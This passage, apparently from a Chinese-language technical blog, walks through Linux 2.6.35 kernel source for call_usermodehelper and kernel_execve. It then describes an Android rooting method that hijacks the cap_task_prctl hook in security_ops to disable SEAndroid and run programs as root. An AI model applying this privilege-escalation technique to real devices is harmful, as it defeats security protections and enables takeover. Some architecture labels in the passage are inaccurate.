class="comment">//用户空间执行的应用程序路径</span></span><br><span class="line">sub_info-&gt;argv = argv;<span class="comment">//应用程序参数</span></span><br><span class="line">sub_info-&gt;envp = envp;<span class="comment">//应用程序环境变量</span></span><br><span class="line">  out:</span><br><span class="line"><span class="keyword">return</span> sub_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L364</span></span><br><span class="line"></span><br><span class="line">void call_usermodehelper_setfns(<span class="keyword">struct</span> subprocess_info *info,</span><br><span class="line">    <span class="keyword">int</span> (*init)(<span class="keyword">struct</span> subprocess_info *info),</span><br><span class="line">    void (*cleanup)(<span class="keyword">struct</span> subprocess_info *info),</span><br><span class="line">    void *data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//设置subprocess_info初始化函数和清理函数 以及相关参数</span></span><br><span class="line"><span class="comment">//设置subprocess_info init函数cleanup函数和data数据</span></span><br><span class="line">info-&gt;cleanup = cleanup;</span><br><span class="line">info-&gt;init = init;</span><br><span class="line">info-&gt;data = data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2、执行设置的用户空间程序-可以看到内核中实际执行函数为-call-usermodehelper"><a href="#2、执行设置的用户空间程序-可以看到内核中实际执行函数为-call-usermodehelper" class="headerlink" title="2、执行设置的用户空间程序:可以看到内核中实际执行函数为__call_usermodehelper"></a>2、执行设置的用户空间程序:可以看到内核中实际执行函数为__call_usermodehelper</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L387</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper_exec</span><span class="params">(struct subprocess_info *sub_info,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">enum</span> umh_wait wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DECLARE_COMPLETION_ONSTACK(done);</span><br><span class="line"><span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">helper_lock();</span><br><span class="line"><span class="keyword">if</span> (sub_info-&gt;path[<span class="number">0</span>] == <span class="string">'\0'</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!khelper_wq || usermodehelper_disabled) &#123;</span><br><span class="line">retval = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_info-&gt;complete = &amp;done;</span><br><span class="line">sub_info-&gt;wait = wait;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//__call_usermodehelper</span></span><br><span class="line">    <span class="comment">//INIT_WORK(&amp;sub_info-&gt;work, __call_usermodehelper);</span></span><br><span class="line">    <span class="comment">//执行__call_usermodehelper</span></span><br><span class="line">queue_work(khelper_wq, &amp;sub_info-&gt;work);</span><br><span class="line"><span class="keyword">if</span> (wait == UMH_NO_WAIT)<span class="comment">/* task has freed sub_info */</span></span><br><span class="line"><span class="keyword">goto</span> unlock;</span><br><span class="line">wait_for_completion(&amp;done);</span><br><span class="line">retval = sub_info-&gt;retval;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">//回收资源 清理函数</span></span><br><span class="line">call_usermodehelper_freeinfo(sub_info);</span><br><span class="line">unlock:</span><br><span class="line">helper_unlock();</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L164</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//调用subprocess_info清理函数 并回收subprocess_info内存</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_usermodehelper_freeinfo</span><span class="params">(struct subprocess_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;cleanup)</span><br><span class="line">(*info-&gt;cleanup)(info);</span><br><span class="line">kfree(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3、call-usermodehelper通过建立一个内核线程完成用户空间程序的执行-call-usermodehelper"><a href="#3、call-usermodehelper通过建立一个内核线程完成用户空间程序的执行-call-usermodehelper" class="headerlink" title="3、call_usermodehelper通过建立一个内核线程完成用户空间程序的执行__call_usermodehelper"></a>3、<strong>call_usermodehelper通过建立一个内核线程完成用户空间程序的执行__</strong>call_usermodehelper</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__call_usermodehelper</span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L213</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __call_usermodehelper(struct work_struct *work)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">sub_info</span> =</span></span><br><span class="line"><span class="class"><span class="title">container_of</span>(<span class="title">work</span>, <span class="title">struct</span> <span class="title">subprocess_info</span>, <span class="title">work</span>);</span></span><br><span class="line"><span class="keyword">enum</span> umh_wait wait = sub_info-&gt;wait;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* CLONE_VFORK: wait until the usermode helper has execve'd</span></span><br><span class="line"><span class="comment"> * successfully We need the data structures to stay around</span></span><br><span class="line"><span class="comment"> * until that is done.  */</span></span><br><span class="line"><span class="keyword">if</span> (wait == UMH_WAIT_PROC)</span><br><span class="line">    <span class="comment">//创建一个等待线程wait_for_helper</span></span><br><span class="line">pid = kernel_thread(wait_for_helper, sub_info,</span><br><span class="line">    CLONE_FS | CLONE_FILES | SIGCHLD);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">//创建____call_usermodehelper线程</span></span><br><span class="line">pid = kernel_thread(____call_usermodehelper, sub_info,</span><br><span class="line">    CLONE_VFORK | SIGCHLD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (wait) &#123;</span><br><span class="line"><span class="keyword">case</span> UMH_NO_WAIT:</span><br><span class="line"><span class="comment">//清理空间</span></span><br><span class="line">call_usermodehelper_freeinfo(sub_info);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> UMH_WAIT_PROC:</span><br><span class="line"><span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* FALLTHROUGH */</span></span><br><span class="line"><span class="keyword">case</span> UMH_WAIT_EXEC:</span><br><span class="line"><span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">sub_info-&gt;retval = pid;</span><br><span class="line">complete(sub_info-&gt;complete);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4、通过内核线程执行用户空间的程序-call-usermodehelper"><a href="#4、通过内核线程执行用户空间的程序-call-usermodehelper" class="headerlink" title="4、通过内核线程执行用户空间的程序____call_usermodehelper"></a>4、通过内核线程执行用户空间的程序____call_usermodehelper</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L132</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ____call_usermodehelper(<span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">sub_info</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">flush_signal_handlers(current, <span class="number">1</span>);</span><br><span class="line">spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We can run anywhere, unlike our parent keventd(). */</span></span><br><span class="line">set_cpus_allowed_ptr(current, cpu_all_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Our parent is keventd, which runs with elevated scheduling priority.</span></span><br><span class="line"><span class="comment"> * Avoid propagating that into the userspace child.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">set_user_nice(current, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sub_info-&gt;init) &#123;</span><br><span class="line">retval = sub_info-&gt;init(sub_info);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实际上的执行函数</span></span><br><span class="line">retval = kernel_execve(sub_info-&gt;path, sub_info-&gt;argv, sub_info-&gt;envp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Exec failed? */</span></span><br><span class="line">fail:</span><br><span class="line">sub_info-&gt;retval = retval;</span><br><span class="line">do_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="5、可以看到最后执行用户空间程序的函数是kernel-execve-对于不同的体系结构-kernel-execve有所不同"><a href="#5、可以看到最后执行用户空间程序的函数是kernel-execve-对于不同的体系结构-kernel-execve有所不同" class="headerlink" title="5、可以看到最后执行用户空间程序的函数是kernel_execve,对于不同的体系结构,kernel_execve有所不同"></a>5、可以看到最后执行用户空间程序的函数是kernel_execve,对于不同的体系结构,kernel_execve有所不同</h5><h6 id="5-1、x64下的执行——通过-NR-execve系统调用"><a href="#5-1、x64下的执行——通过-NR-execve系统调用" class="headerlink" title="5.1、x64下的执行——通过__NR_execve系统调用"></a>5.1、x64下的执行——通过<a href="https://elixir.bootlin.com/linux/v2.6.35/source/arch/x86/include/asm/unistd_64.h#L140" target="_blank" rel="noopener">__NR_execve系统调用</a></h6><p>通过系统调用__NR_execve执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/arch/sh/kernel/sys_sh64.c#L36</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __sc0 __asm__ (<span class="string">"r9"</span>) = ((<span class="number">0x13</span> &lt;&lt; <span class="number">16</span>) | __NR_execve);</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __sc2 __asm__ (<span class="string">"r2"</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) filename;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __sc3 __asm__ (<span class="string">"r3"</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) argv;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __sc4 __asm__ (<span class="string">"r4"</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) envp;</span><br><span class="line">__asm__ __volatile__ (<span class="string">"trapa%1 !\t\t\t execve(%2,%3,%4)"</span></span><br><span class="line">: <span class="string">"=r"</span> (__sc0)</span><br><span class="line">: <span class="string">"r"</span> (__sc0), <span class="string">"r"</span> (__sc2), <span class="string">"r"</span> (__sc3), <span class="string">"r"</span> (__sc4) );</span><br><span class="line">__asm__ __volatile__ (<span class="string">"!dummy%0 %1 %2 %3"</span></span><br><span class="line">: : <span class="string">"r"</span> (__sc0), <span class="string">"r"</span> (__sc2), <span class="string">"r"</span> (__sc3), <span class="string">"r"</span> (__sc4) : <span class="string">"memory"</span>);</span><br><span class="line"><span class="keyword">return</span> __sc0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="5-2、32位x86下的执行——通过-NR-execve系统调用"><a href="#5-2、32位x86下的执行——通过-NR-execve系统调用" class="headerlink" title="5.2、32位x86下的执行——通过__NR_execve系统调用"></a>5.2、32位x86下的执行——通过<a href="https://elixir.bootlin.com/linux/v2.6.35/source/arch/x86/include/asm/unistd_32.h#L19" target="_blank" rel="noopener">__NR_execve系统调用</a></h6><p>通过系统调用__NR_execve执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/arch/sh/kernel/sys_sh32.c#L74</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">long</span> __sc0 __asm__ (<span class="string">"r3"</span>) = __NR_execve;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">long</span> __sc4 __asm__ (<span class="string">"r4"</span>) = (<span class="keyword">long</span>) filename;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">long</span> __sc5 __asm__ (<span class="string">"r5"</span>) = (<span class="keyword">long</span>) argv;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">long</span> __sc6 __asm__ (<span class="string">"r6"</span>) = (<span class="keyword">long</span>) envp;</span><br><span class="line">__asm__ __volatile__ (SYSCALL_ARG3 : <span class="string">"=z"</span> (__sc0)</span><br><span class="line">: <span class="string">"0"</span> (__sc0), <span class="string">"r"</span> (__sc4), <span class="string">"r"</span> (__sc5), <span class="string">"r"</span> (__sc6)</span><br><span class="line">: <span class="string">"memory"</span>);</span><br><span class="line"><span class="keyword">return</span> __sc0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="5-3、arm下的执行"><a href="#5-3、arm下的执行" class="headerlink" title="5.3、arm下的执行"></a>5.3、arm下的执行</h6><p>arm下通过调用do_execve执行用户空间的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct pt_regs));</span><br><span class="line"><span class="comment">//调用do_execve执行</span></span><br><span class="line">ret = do_execve((<span class="keyword">char</span> *)filename, (<span class="keyword">char</span> __user * __user *)argv,</span><br><span class="line">(<span class="keyword">char</span> __user * __user *)envp, &amp;regs);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Save argc to the register structure for userspace.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">regs.ARM_r0 = ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We were successful.  We won't be returning to our caller, but</span></span><br><span class="line"><span class="comment"> * instead to user space by manipulating the kernel stack.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"addr0, %0, %1\n\t"</span></span><br><span class="line"><span class="string">"movr1, %2\n\t"</span></span><br><span class="line"><span class="string">"movr2, %3\n\t"</span></span><br><span class="line"><span class="string">"blmemmove\n\t"</span><span class="comment">/* copy regs to top of stack */</span></span><br><span class="line"><span class="string">"movr8, #0\n\t"</span><span class="comment">/* not a syscall */</span></span><br><span class="line"><span class="string">"movr9, %0\n\t"</span><span class="comment">/* thread structure */</span></span><br><span class="line"><span class="string">"movsp, r0\n\t"</span><span class="comment">/* reposition stack pointer */</span></span><br><span class="line"><span class="string">"bret_to_user"</span></span><br><span class="line">:</span><br><span class="line">: <span class="string">"r"</span> (current_thread_info()),</span><br><span class="line">  <span class="string">"Ir"</span> (THREAD_START_SP - <span class="keyword">sizeof</span>(regs)),</span><br><span class="line">  <span class="string">"r"</span> (&amp;regs),</span><br><span class="line">  <span class="string">"Ir"</span> (<span class="keyword">sizeof</span>(regs))</span><br><span class="line">: <span class="string">"r0"</span>, <span class="string">"r1"</span>, <span class="string">"r2"</span>, <span class="string">"r3"</span>, <span class="string">"ip"</span>, <span class="string">"lr"</span>, <span class="string">"memory"</span>);</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="call-usermodehelper实现root思路"><a href="#call-usermodehelper实现root思路" class="headerlink" title="call_usermodehelper实现root思路"></a>call_usermodehelper实现root思路</h3><p>1、从security_ops结构中(security_operations)找到cap_task_prctl表的地址<br>2、修改cap_task_prctl的值为reset_security_ops的地址<br>3、调用prctl函数关闭SEAndroid<br>4、修改cap_task_prctl为call_usermodehelper函数地址实现以内核线程执行用户空间程序</p><h4 id="security-ops结构简介"><a href="#security-ops结构简介" class="headerlink" title="security_ops结构简介"></a>security_ops结构简介</h4><p>可以发现当执行security_task_prctl实际上就是执行cap_task_prctl,且5个参数均原封不动的进行了传递,均可控</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/security/security.c#L28</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">security_operations</span> *<span class="title">security_ops</span>;</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/security.h#L1364</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_operations</span> &#123;</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/security.h#L1762</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/security.h#L74</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> cap_task_prctl(option, arg2, arg3, arg3, arg5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="reset-security-ops函数简介"><a href="#reset-security-ops函数简介" class="headerlink" title="reset_security_ops函数简介"></a>reset_security_ops函数简介</h4><p>在security_init初始化时候有个默认的default_security_ops,通过security_fixup_ops<br>对默认的security_ops进行了相关安全、权限函数的设置(cap_key_free等),所以设置相关selinux等<br>安全性函数是通过security_fixup_ops实现的,默认的default_security_ops并未有任何相关的保护<br>reset_security_ops用于设置security_ops为default_security_ops即达到关闭selinux的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/security/security.c#L57</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">init <span class="title">security_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_INFO <span class="string">"Security Framework initialized\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//security fixup</span></span><br><span class="line">    <span class="comment">//https://elixir.bootlin.com/linux/v2.6.35/source/security/capability.c#L857</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ops-&gt;function = cap_##function;  cap_key_free等</span></span><br><span class="line">    <span class="comment">//security_fixup_ops是设置相关cap函数开启安全性</span></span><br><span class="line">    <span class="comment">//default_security_ops没有开启</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数set_to_cap_if_null(https://elixir.bootlin.com/linux/v2.6.35/source/security/capability.c#L848)</span></span><br><span class="line">    security_fixup_ops(&amp;default_security_ops);</span><br><span class="line">security_ops = &amp;default_security_ops;</span><br><span class="line">do_security_initcalls();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/security/security.c#L68</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_security_ops</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//关闭selinux相关安全保护</span></span><br><span class="line">security_ops = &amp;default_security_ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用prctl函数关闭SEAndroid——cap-task-prctl的值为reset-security-ops的地址"><a href="#调用prctl函数关闭SEAndroid——cap-task-prctl的值为reset-security-ops的地址" class="headerlink" title="调用prctl函数关闭SEAndroid——cap_task_prctl的值为reset_security_ops的地址"></a>调用prctl函数关闭SEAndroid——cap_task_prctl的值为reset_security_ops的地址</h4><p>当修改cap_task_prctl为reset_security_ops的地址时,通过调用prctl系统调用,实现security_task_prctl调用,<br>而从上面security_ops结构简介中我们知道security_task_prctl会调用cap_task_prctl,所以此时截获控制流执行reset_security_ops函数关闭SEAndroid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/sys.c#L1466</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prctl系统调用调用security_task_prctl(security_task_prctl实际上调用cap_task_prctl,而cap_task_prctl被修改成了reset_security_ops从而关闭了SEAndroid)</span><br><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span 